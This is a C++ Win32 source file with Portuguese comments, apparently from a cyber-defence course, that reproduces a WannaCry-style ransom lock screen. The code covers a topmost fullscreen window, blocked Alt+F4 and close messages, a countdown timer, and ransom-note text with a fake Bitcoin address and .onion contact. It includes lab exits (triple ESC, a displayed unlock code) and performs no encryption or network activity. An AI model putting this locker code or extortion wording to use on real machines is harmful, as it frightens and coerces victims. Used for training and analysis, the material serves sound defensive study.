/*
 * ============================================================
 *  LOCKSCREEN.CPP  —  Tela de Resgate (Lock Screen Educacional)
 * ============================================================
 *
 *  REPLICA VISUAL de ransomwares famosos:
 *    - WannaCry  (2017) — tela vermelha, countdown, Bitcoin
 *    - Petya     (2016) — skull ASCII, tela preta
 *    - LockBit 3 (2022) — UI profissional, dark mode
 *
 *  TÉCNICAS DEMONSTRADAS:
 *    1. Janela fullscreen sem borda (topmost)
 *    2. Bloqueio de Alt+F4 e teclas de escape
 *    3. Countdown timer via SetTimer (WM_TIMER)
 *    4. Renderização customizada com GDI (DrawText, FillRect)
 *    5. "Verificação de pagamento" (campo de input fake)
 *
 *  SAÍDA DE EMERGÊNCIA (LAB):
 *    Pressione ESC três vezes seguidas para fechar.
 *
 *  COMPILE:
 *    g++ lockscreen.cpp -o lockscreen.exe -static -static-libgcc
 *        -static-libstdc++ -lgdi32 -luser32 -mwindows
 *
 *  NOTA: -mwindows remove a janela de console (app gráfico puro)
 * ============================================================
 */

#include <windows.h>
#include <string>
#include <sstream>
#include <iomanip>
#include <ctime>

// ═══════════════════════════════════════════════════════════
//  CONFIGURAÇÃO DO LAB
// ═══════════════════════════════════════════════════════════

// Endereço Bitcoin FALSO (formato real mas sem validade)
const wchar_t* BTC_ADDRESS   = L"1LabXX9mK4rQ3fN8vT2uY7pW6hC5jD0eA";

// Valor do resgate (simulado)
const wchar_t* VALOR_RESGATE = L"0.05 BTC  (~R$ 15.000,00)";

// ID único da "vítima" (em ataques reais é gerado por máquina)
const wchar_t* VICTIM_ID     = L"VICTIM-LAB-2025-A3F9B2C1";

// Prazo: 72 horas a partir de agora
const int PRAZO_HORAS = 72;

// Código secreto para fechar (LAB ONLY)
const wchar_t* CODIGO_FECHAR = L"LABORATO";


// ═══════════════════════════════════════════════════════════
//  ESTADO GLOBAL DA APLICAÇÃO
// ═══════════════════════════════════════════════════════════
int  g_escCount       = 0;          // Contador de ESC pressionados
int  g_segundosRestantes;           // Countdown em segundos
bool g_paginaAtual    = 0;          // 0 = principal, 1 = "como pagar"
std::wstring g_inputCodigo;         // Texto digitado no campo de código
bool g_codigoErrado   = false;      // Flag de erro no código
bool g_codigoCorreto  = false;      // Flag de sucesso

// Calcula segundos totais do prazo
void inicializarTimer() {
    g_segundosRestantes = PRAZO_HORAS * 3600;
}

// Formata segundos restantes em HH:MM:SS
std::wstring formatarTempo(int segundos) {
    int h = segundos / 3600;
    int m = (segundos % 3600) / 60;
    int s = segundos % 60;
    std::wostringstream ss;
    ss << std::setfill(L'0')
       << std::setw(2) << h << L":"
       << std::setw(2) << m << L":"
       << std::setw(2) << s;
    return ss.str();
}


// ═══════════════════════════════════════════════════════════
//  CORES E FONTES (TEMA WANNACRY — VERMELHO + PRETO)
//
//  ANÁLISE: Cores e layout são assinaturas visuais.
//  Pesquisadores usam screenshots para atribuição de família.
//  WannaCry = vermelho. Petya = preto/skull. LockBit = roxo.
// ═══════════════════════════════════════════════════════════
#define COR_FUNDO        RGB(20,  20,  20)   // Preto quase total
#define COR_PAINEL       RGB(180,  20,  20)  // Vermelho WannaCry
#define COR_PAINEL_ESCURO RGB(120, 10,  10)  // Vermelho escuro
#define COR_TEXTO_BRANCO RGB(255, 255, 255)
#define COR_TEXTO_AMARELO RGB(255, 200,  0)
#define COR_TEXTO_CINZA  RGB(180, 180, 180)
#define COR_TIMER        RGB(255,  60,  60)  // Vermelho brilhante
#define COR_BTC          RGB(247, 147,  26)  // Laranja Bitcoin
#define COR_VERDE        RGB(0,   220,  80)  // Sucesso


// ═══════════════════════════════════════════════════════════
//  RENDERIZAÇÃO DA TELA PRINCIPAL
// ═══════════════════════════════════════════════════════════
void desenharTelaPrincipal(HDC hdc, RECT clienteRect) {
    int W = clienteRect.right;
    int H = clienteRect.bottom;

    // --- Fundo preto ---
    HBRUSH brFundo = CreateSolidBrush(COR_FUNDO);
    FillRect(hdc, &clienteRect, brFundo);
    DeleteObject(brFundo);

    // --- Painel esquerdo vermelho (60% da largura) ---
    RECT painelEsq = { 0, 0, (LONG)(W * 0.62), H };
    HBRUSH brPainel = CreateSolidBrush(COR_PAINEL);
    FillRect(hdc, &painelEsq, brPainel);
    DeleteObject(brPainel);

    // --- Cabeçalho: ícone de cadeado + título ---
    SetBkMode(hdc, TRANSPARENT);

    // Ícone de caveira/cadeado em ASCII art grande
    HFONT fntIcone = CreateFontW(80, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Courier New");
    SelectObject(hdc, fntIcone);
    SetTextColor(hdc, COR_TEXTO_BRANCO);
    RECT rIcone = { 20, 15, (LONG)(W * 0.62) - 20, 110 };
    DrawTextW(hdc, L"[  !  ]  Oops, seus arquivos foram cifrados!", -1,
              &rIcone, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
    DeleteObject(fntIcone);

    // Linha separadora
    HPEN penLinha = CreatePen(PS_SOLID, 2, COR_TEXTO_BRANCO);
    SelectObject(hdc, penLinha);
    MoveToEx(hdc, 20, 115, NULL);
    LineTo(hdc, (int)(W * 0.62) - 20, 115);
    DeleteObject(penLinha);

    // --- Texto explicativo ---
    HFONT fntTexto = CreateFontW(18, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Segoe UI");
    SelectObject(hdc, fntTexto);
    SetTextColor(hdc, COR_TEXTO_BRANCO);

    const wchar_t* textoExpl =
        L"O que aconteceu com meus arquivos?\r\n\r\n"
        L"Seus documentos importantes (fotos, bancos de dados,\r\n"
        L"planilhas e outros) foram cifrados com criptografia\r\n"
        L"AES-256 + RSA-2048. Sem a chave privada guardada em\r\n"
        L"nosso servidor, a recuperacao e matematicamente impossivel.\r\n\r\n"
        L"Como recuperar meus arquivos?\r\n\r\n"
        L"Voce so tem UMA opcao: pagar o resgate antes do prazo.\r\n"
        L"Apos o prazo, o valor DOBRA. Apos 7 dias, a chave e\r\n"
        L"destruida permanentemente e seus arquivos sao perdidos.";

    RECT rTexto = { 20, 130, (LONG)(W * 0.62) - 20, 380 };
    DrawTextW(hdc, textoExpl, -1, &rTexto, DT_LEFT | DT_WORDBREAK);
    DeleteObject(fntTexto);

    // --- Countdown Timer ---
    HFONT fntTimerLabel = CreateFontW(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Segoe UI");
    SelectObject(hdc, fntTimerLabel);
    SetTextColor(hdc, COR_TEXTO_AMARELO);
    RECT rLabel = { 20, 390, (LONG)(W * 0.62) - 20, 420 };
    DrawTextW(hdc, L"  Tempo restante para o valor dobrar:", -1, &rLabel, DT_LEFT);
    DeleteObject(fntTimerLabel);

    // Número do timer grande e vermelho
    HFONT fntTimer = CreateFontW(58, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Courier New");
    SelectObject(hdc, fntTimer);
    SetTextColor(hdc, COR_TIMER);
    std::wstring tempoStr = formatarTempo(g_segundosRestantes);
    RECT rTimer = { 20, 420, (LONG)(W * 0.62) - 20, 490 };
    DrawTextW(hdc, tempoStr.c_str(), -1, &rTimer, DT_CENTER);
    DeleteObject(fntTimer);

    // --- ID da vítima ---
    HFONT fntId = CreateFontW(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Courier New");
    SelectObject(hdc, fntId);
    SetTextColor(hdc, COR_TEXTO_CINZA);
    RECT rId = { 20, 500, (LONG)(W * 0.62) - 20, 530 };
    std::wstring idText = std::wstring(L"Seu ID: ") + VICTIM_ID;
    DrawTextW(hdc, idText.c_str(), -1, &rId, DT_LEFT);
    DeleteObject(fntId);

    // --- Rodapé do painel esquerdo ---
    HFONT fntRodape = CreateFontW(13, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Segoe UI");
    SelectObject(hdc, fntRodape);
    SetTextColor(hdc, RGB(220, 180, 180));
    RECT rRodape = { 20, H - 40, (LONG)(W * 0.62) - 20, H - 10 };
    DrawTextW(hdc, L"[LAB] Pressione ESC tres vezes para sair  |  Curso: Defesa Cibernetica",
              -1, &rRodape, DT_CENTER);
    DeleteObject(fntRodape);


    // ─────────────────────────────────────────────────────────
    //  PAINEL DIREITO — Instruções de pagamento
    // ─────────────────────────────────────────────────────────
    RECT painelDir = { (LONG)(W * 0.62), 0, W, H };
    HBRUSH brDir = CreateSolidBrush(RGB(30, 30, 30));
    FillRect(hdc, &painelDir, brDir);
    DeleteObject(brDir);

    int xD = (int)(W * 0.62) + 20;
    int wD = W - xD - 20;

    // Título do painel direito
    HFONT fntTitDir = CreateFontW(22, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Segoe UI");
    SelectObject(hdc, fntTitDir);
    SetTextColor(hdc, COR_TEXTO_BRANCO);
    RECT rTitDir = { xD, 20, W - 20, 60 };
    DrawTextW(hdc, L"Como pagar o resgate", -1, &rTitDir, DT_LEFT);
    DeleteObject(fntTitDir);

    // Linha separadora direita
    HPEN penDir = CreatePen(PS_SOLID, 1, RGB(80, 80, 80));
    SelectObject(hdc, penDir);
    MoveToEx(hdc, xD, 65, NULL);
    LineTo(hdc, W - 20, 65);
    DeleteObject(penDir);

    // Passos numerados
    HFONT fntPassos = CreateFontW(15, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Segoe UI");
    SelectObject(hdc, fntPassos);

    struct { int y; COLORREF cor; const wchar_t* txt; } passos[] = {
        { 80,  COR_TEXTO_AMARELO, L"Passo 1 — Obtenha Bitcoin" },
        { 100, COR_TEXTO_CINZA,   L"Use Binance, Mercado Bitcoin ou" },
        { 118, COR_TEXTO_CINZA,   L"qualquer exchange para comprar BTC." },
        { 148, COR_TEXTO_AMARELO, L"Passo 2 — Envie o pagamento" },
        { 168, COR_TEXTO_CINZA,   L"Envie exatamente:" },
        { 200, COR_TEXTO_AMARELO, L"Passo 3 — Nos contate" },
        { 220, COR_TEXTO_CINZA,   L"Email: lab@educacional.onion" },
        { 238, COR_TEXTO_CINZA,   L"Informe seu ID ao efetuar contato." },
    };
    for (auto& p : passos) {
        SetTextColor(hdc, p.cor);
        RECT r = { xD, p.y, W - 20, p.y + 30 };
        DrawTextW(hdc, p.txt, -1, &r, DT_LEFT);
    }
    DeleteObject(fntPassos);

    // Valor do resgate
    HFONT fntValor = CreateFontW(24, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Segoe UI");
    SelectObject(hdc, fntValor);
    SetTextColor(hdc, COR_TEXTO_BRANCO);
    RECT rValor = { xD, 168, W - 20, 205 };
    DrawTextW(hdc, VALOR_RESGATE, -1, &rValor, DT_LEFT);
    DeleteObject(fntValor);

    // Endereço Bitcoin com fundo laranja
    RECT rBtcBg = { xD - 5, 268, W - 15, 310 };
    HBRUSH brBtc = CreateSolidBrush(RGB(40, 30, 10));
    FillRect(hdc, &rBtcBg, brBtc);
    DeleteObject(brBtc);

    HFONT fntBtc = CreateFontW(14, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Courier New");
    SelectObject(hdc, fntBtc);
    SetTextColor(hdc, COR_BTC);
    RECT rBtcLabel = { xD, 255, W - 20, 275 };
    DrawTextW(hdc, L"Endereco Bitcoin:", -1, &rBtcLabel, DT_LEFT);
    RECT rBtc = { xD, 272, W - 20, 310 };
    DrawTextW(hdc, BTC_ADDRESS, -1, &rBtc, DT_LEFT);
    DeleteObject(fntBtc);

    // Campo de código de desbloqueio
    HFONT fntCampo = CreateFontW(15, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Segoe UI");
    SelectObject(hdc, fntCampo);
    SetTextColor(hdc, COR_TEXTO_CINZA);
    RECT rCampoLabel = { xD, 340, W - 20, 365 };
    DrawTextW(hdc, L"Ja pagou? Digite o codigo de desbloqueio:", -1, &rCampoLabel, DT_LEFT);
    DeleteObject(fntCampo);

    // Caixa do campo de input
    RECT rCaixaBg = { xD - 5, 368, W - 80, 400 };
    HBRUSH brCaixa = CreateSolidBrush(RGB(50, 50, 50));
    FillRect(hdc, &rCaixaBg, brCaixa);
    DeleteObject(brCaixa);

    // Borda da caixa
    HPEN penCaixa;
    if (g_codigoErrado)
        penCaixa = CreatePen(PS_SOLID, 2, COR_TIMER);
    else if (g_codigoCorreto)
        penCaixa = CreatePen(PS_SOLID, 2, COR_VERDE);
    else
        penCaixa = CreatePen(PS_SOLID, 1, RGB(120, 120, 120));
    SelectObject(hdc, penCaixa);
    SelectObject(hdc, GetStockObject(NULL_BRUSH));
    Rectangle(hdc, rCaixaBg.left, rCaixaBg.top, rCaixaBg.right, rCaixaBg.bottom);
    DeleteObject(penCaixa);

    // Texto digitado no campo
    HFONT fntInput = CreateFontW(18, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Courier New");
    SelectObject(hdc, fntInput);

    if (g_codigoCorreto) {
        SetTextColor(hdc, COR_VERDE);
        RECT rOk = { xD, 368, W - 20, 400 };
        DrawTextW(hdc, L"  CODIGO CORRETO — Encerrando...", -1, &rOk, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
    } else if (g_codigoErrado) {
        SetTextColor(hdc, COR_TIMER);
        RECT rErro = { xD, 368, W - 80, 400 };
        DrawTextW(hdc, (std::wstring(L"  ") + g_inputCodigo).c_str(), -1, &rErro,
                  DT_LEFT | DT_VCENTER | DT_SINGLELINE);
    } else {
        SetTextColor(hdc, COR_TEXTO_BRANCO);
        std::wstring inputComCursor = L"  " + g_inputCodigo + L"_";
        RECT rInput = { xD, 368, W - 80, 400 };
        DrawTextW(hdc, inputComCursor.c_str(), -1, &rInput, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
    }
    DeleteObject(fntInput);

    // Mensagem de erro
    if (g_codigoErrado) {
        HFONT fntErro = CreateFontW(13, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Segoe UI");
        SelectObject(hdc, fntErro);
        SetTextColor(hdc, COR_TIMER);
        RECT rErroMsg = { xD, 405, W - 20, 425 };
        DrawTextW(hdc, L"Codigo invalido. Tente novamente.", -1, &rErroMsg, DT_LEFT);
        DeleteObject(fntErro);
    }

    // Botão ENTER visual
    RECT rBtnBg = { W - 75, 368, W - 15, 400 };
    HBRUSH brBtn = CreateSolidBrush(COR_PAINEL);
    FillRect(hdc, &rBtnBg, brBtn);
    DeleteObject(brBtn);
    HFONT fntBtn = CreateFontW(14, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Segoe UI");
    SelectObject(hdc, fntBtn);
    SetTextColor(hdc, COR_TEXTO_BRANCO);
    DrawTextW(hdc, L"OK", -1, &rBtnBg, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
    DeleteObject(fntBtn);

    // Nota técnica educacional
    HFONT fntNota = CreateFontW(12, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Segoe UI");
    SelectObject(hdc, fntNota);
    SetTextColor(hdc, RGB(80, 80, 80));
    RECT rNota = { xD, H - 80, W - 20, H - 10 };
    DrawTextW(hdc,
        L"[ANALISE] Codigo de desbloqueio = LABORATO\r\n"
        L"Em ataques reais, so o servidor C2 tem a chave.\r\n"
        L"Sem pagamento = sem recuperacao (AES-256 + RSA-2048).",
        -1, &rNota, DT_LEFT | DT_WORDBREAK);
    DeleteObject(fntNota);
}


// ═══════════════════════════════════════════════════════════
//  WINDOW PROCEDURE — Trata mensagens do Windows
//
//  ANÁLISE: WndProc é onde ficam os bloqueios de teclado.
//  Em x64dbg, breakpoint em WM_KEYDOWN revela quais teclas
//  o malware monitora e ignora.
// ═══════════════════════════════════════════════════════════
LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {

    // ── Timer: decrementa o countdown (ID=1) ou fecha após código correto (ID=2) ──
    case WM_TIMER:
        if (wParam == 1) {
            if (g_segundosRestantes > 0) g_segundosRestantes--;
            InvalidateRect(hWnd, NULL, FALSE);
        } else if (wParam == 2) {
            PostQuitMessage(0);
        }
        return 0;

    // ── Teclado: captura input do código de desbloqueio ──
    case WM_KEYDOWN: {
        int vk = (int)wParam;

        // SAÍDA DE EMERGÊNCIA DO LAB: ESC pressionado 3x
        if (vk == VK_ESCAPE) {
            g_escCount++;
            if (g_escCount >= 3) PostQuitMessage(0);
            return 0;
        }
        g_escCount = 0;

        // ANÁLISE: Alt+F4 bloqueado — mensagem WM_SYSCOMMAND/SC_CLOSE
        // é ignorada abaixo. Aqui bloqueamos também via keydown.
        if (vk == VK_F4 && (GetKeyState(VK_MENU) & 0x8000)) return 0;

        // Backspace no campo de código
        if (vk == VK_BACK && !g_inputCodigo.empty()) {
            g_inputCodigo.pop_back();
            g_codigoErrado = false;
        }

        // ENTER: valida o código digitado
        if (vk == VK_RETURN) {
            if (g_inputCodigo == CODIGO_FECHAR) {
                g_codigoCorreto = true;
                InvalidateRect(hWnd, NULL, FALSE);
                // Aguarda 1.5s para mostrar "CORRETO" antes de fechar
                SetTimer(hWnd, 2, 1500, NULL);
            } else {
                g_codigoErrado = true;
            }
        }
        InvalidateRect(hWnd, NULL, FALSE);
        return 0;
    }

    // ── Caracteres: adiciona ao campo de código ───────────
    case WM_CHAR: {
        wchar_t c = (wchar_t)wParam;
        // Aceita apenas letras e números (ignora control chars)
        if (c >= 32 && c < 127 && g_inputCodigo.size() < 20) {
            g_inputCodigo += towupper(c);
            g_codigoErrado = false;
        }
        InvalidateRect(hWnd, NULL, FALSE);
        return 0;
    }


    // ── Desenho da janela ─────────────────────────────────
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);

        // Double buffering: evita flickering no timer
        RECT rect;
        GetClientRect(hWnd, &rect);
        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP bmp = CreateCompatibleBitmap(hdc, rect.right, rect.bottom);
        SelectObject(hdcMem, bmp);

        desenharTelaPrincipal(hdcMem, rect);

        // Copia buffer para tela
        BitBlt(hdc, 0, 0, rect.right, rect.bottom, hdcMem, 0, 0, SRCCOPY);
        DeleteObject(bmp);
        DeleteDC(hdcMem);
        EndPaint(hWnd, &ps);
        return 0;
    }

    // ── Bloqueia Alt+F4 e fechar pela barra de tarefas ───
    case WM_SYSCOMMAND:
        // ANÁLISE: SC_CLOSE = clique no X ou Alt+F4
        // Ransomwares bloqueiam para impedir fuga fácil
        if ((wParam & 0xFFF0) == SC_CLOSE) return 0;
        break;

    // ── Bloqueia clique no X ──────────────────────────────
    case WM_CLOSE:
        // Ignorado intencionalmente
        return 0;

    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hWnd, msg, wParam, lParam);
}


// ═══════════════════════════════════════════════════════════
//  WinMain — Ponto de entrada de aplicativo gráfico Windows
//
//  DIFERENÇA de main(): WinMain não tem console associado.
//  Ransomwares usam WinMain (ou ocultam o console com
//  FreeConsole()) para não mostrar janela preta ao executar.
// ═══════════════════════════════════════════════════════════
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {

    inicializarTimer();

    // Registra a classe da janela
    WNDCLASSEXW wc = {};
    wc.cbSize        = sizeof(wc);
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hInst;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"RansomLock";
    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    RegisterClassExW(&wc);

    // Dimensões da tela completa
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    // Cria janela fullscreen sem borda, sempre no topo
    // ANÁLISE: WS_EX_TOPMOST + sem WS_CAPTION = janela que cobre tudo
    HWND hWnd = CreateWindowExW(
        WS_EX_TOPMOST,                          // Sempre no topo de tudo
        L"RansomLock",
        L"",
        WS_POPUP | WS_VISIBLE,                  // Sem borda, sem título
        0, 0, sw, sh,                           // Cobre a tela inteira
        NULL, NULL, hInst, NULL
    );

    // Oculta o cursor (ransomwares agressivos fazem isso)
    // ShowCursor(FALSE);  ← descomentado = mais realista, mas incômodo no lab

    // Timer de 1 segundo para o countdown (ID = 1)
    SetTimer(hWnd, 1, 1000, NULL);

    // Loop de mensagens — mantém a janela viva
    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    // ShowCursor(TRUE);  ← reativar cursor se tiver ocultado
    return 0;
}
